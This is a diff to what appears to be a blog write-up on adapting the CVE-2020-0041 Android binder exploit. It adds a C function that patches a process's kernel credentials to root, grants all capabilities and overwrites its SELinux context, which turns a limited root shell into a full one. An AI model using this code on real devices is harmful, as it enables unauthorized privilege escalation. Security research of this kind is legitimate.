@@ -142,6 +142,50 @@ root_by_cve-2020-0041:/ #
 
 ## Improvements
 
-After adapting the exploit, you will obtain a root shell; however, the shell will be very limited and not fully working.
+## Issues and improvements
 
-In order to ... //TODO
+After the adaptation of the exploit and its execution, you will obtain a root shell; however, this root shell is very limited and you will have some problems executing binaries and creating files. 
+
+Finding on the Internet I found the issue: *you need to patch the security context of the root user.*
+
+During the exploit execution the process executed need to be patched with the correct security context for the root user. The next function is used to patch the credentials of a specific address:
+
+
+{{< code language="bash" title="Patching task credentials" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
+```c
+void patch_task_cred(uint64_t cred_addr, uint32_t init_sid)
+{
+    uint64_t val;
+    struct cred *cred = (void *)cred_addr;
+    struct task_security_struct *sec;
+
+    if (cred == NULL)
+        return;
+
+    val = 0;
+    write32((uint64_t)&cred->uid, val);
+    write32((uint64_t)&cred->gid, val);
+    write32((uint64_t)&cred->suid, val);
+    write32((uint64_t)&cred->sgid, val);
+    write32((uint64_t)&cred->euid, val);
+    write32((uint64_t)&cred->egid, val);
+    write32((uint64_t)&cred->fsuid, val);
+    write32((uint64_t)&cred->fsgid, val);
+    write32((uint64_t)&cred->securebits, val);
+
+    val = ~(0UL);
+    write64((uint64_t)&cred->cap_inheritable, val);
+    write64((uint64_t)&cred->cap_permitted, val);
+    write64((uint64_t)&cred->cap_effective, val);
+    write64((uint64_t)&cred->cap_bset, val);
+    //write64((uint64_t)&cred->cap_ambient, val);
+
+    sec = (void *)read64((uint64_t)&cred->security);
+
+    if (sec != NULL) {
+        write32((uint64_t)&sec->osid, init_sid);
+        write32((uint64_t)&sec->sid, init_sid);
+    }
+}
+```
+{{< /code >}}
